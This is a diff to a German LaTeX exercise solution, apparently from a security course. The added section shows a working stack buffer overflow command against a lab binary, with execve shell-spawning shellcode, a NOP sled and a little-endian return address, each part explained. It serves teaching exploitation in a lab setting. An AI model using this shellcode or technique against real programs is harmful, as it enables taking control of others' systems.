@@ -36,6 +36,11 @@ Eine Authentifizierung mithilfe eines Buffer Overflows wie zuvor ist somit nicht
 \end{figure}
 \section*{Aufgabe 3: Shellcode}
 \section*{Aufgabe 4: Stack-Based Buffer Overflow}
+\subsection*{a)}
+Das Programm ''basic\_overflow'' muss folgendermaßen in der Shell eingegeben werden:
+./basic\_overflow \$(python -c 'print "$\backslash$x31$\backslash$xc9$\backslash$xf7$\backslash$xe1$\backslash$x51$\backslash$x68$\backslash$x64$\backslash$x61$\backslash$x73$\backslash$x68$\backslash$x68$\backslash$x2f$\backslash$x2f$\backslash$x2f$\backslash$x2f$\backslash$x68$\backslash$x2f$\backslash$x62$\backslash$x69$\backslash$x6e$\backslash$x89$\backslash$xe3$\backslash$xb0$\backslash$x0b$\backslash$xcd$\backslash$x80" + "$\backslash$x90"*86 + "$\backslash$xcc$\backslash$xce$\backslash$xff$\backslash$xff"')
+Dabei ist das \$-Zeichen zu beachten, welches eine Subshell aufruft, womit man in einem Shellbefehl einen weiteren Befehl ausführen kann.
+Die Angabe ist hier in Little-Endian. Der erste Teil ist der Shellcode (von $\backslash$x31 bis zum ersten +) danach kommt das NOP-Padding. Nach dem Padding kommt die Return-Adresse, welches das Programm ausgibt.
 \section*{Aufgabe 5:  Smashing the Stack for Fun and Exam Prep}
 \subsection*{a)}
 \begin{figure}[h]
